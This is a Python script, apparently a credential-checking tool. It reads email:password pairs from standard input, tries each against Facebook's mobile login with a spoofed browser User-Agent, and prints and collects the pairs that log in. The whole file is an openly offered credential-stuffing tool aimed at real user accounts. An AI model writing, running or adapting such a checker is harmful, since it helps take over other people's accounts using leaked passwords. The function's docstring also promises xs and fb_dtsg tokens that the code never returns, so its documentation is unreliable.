import pyquery
import requests


def login(session, email, password):
    '''
    Attempt to login to Facebook. Returns user ID, xs token and
    fb_dtsg token. All 3 are required to make requests to
    Facebook endpoints as a logged in user. Returns False if
    login failed.
    '''

    # Navigate to Facebook's homepage to load Facebook's cookies.
    response = session.get('https://m.facebook.com')

    # Attempt to login to Facebook
    response = session.post('https://m.facebook.com/login.php', data={
        'email': email,
        'pass': password
    }, allow_redirects=False)

    # If c_user cookie is present, login was successful
    if 'c_user' in response.cookies:

        # Make a request to homepage to get fb_dtsg token
        homepage_resp = session.get('https://m.facebook.com/home.php')

        dom = pyquery.PyQuery(homepage_resp.text.encode('utf8'))
        fb_dtsg = dom('input[name="fb_dtsg"]').val()
        # print(fb_dtsg, str(list(response.cookies)),sep="****")

        return response.cookies['c_user']
    else:
        return False


if __name__ == "__main__":

    # parser = argparse.ArgumentParser(description='Login to Facebook')
    # parser.add_argument('email', help='Email address')
    # parser.add_argument('password', help='Login password')
    #
    # args = parser.parse_args()

    data = "fjhdgshgfhsg"
    epw = []
    while (data != "stop:stop"):
        data = input()
        try:
            email, password = data.strip().split(":")
        except:
            continue
        session = requests.session()
        session.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:39.0) Gecko/20100101 Firefox/39.0'})

        x = login(session, email, password)
        if x:
            user_id = x
            if user_id:
                print(email + ":" + password)
                print(user_id)
                epw.append(str(email + ":" + password))
            else:
                print('Login Failed')
        else:
            print('Login Failed')
    print(*epw)
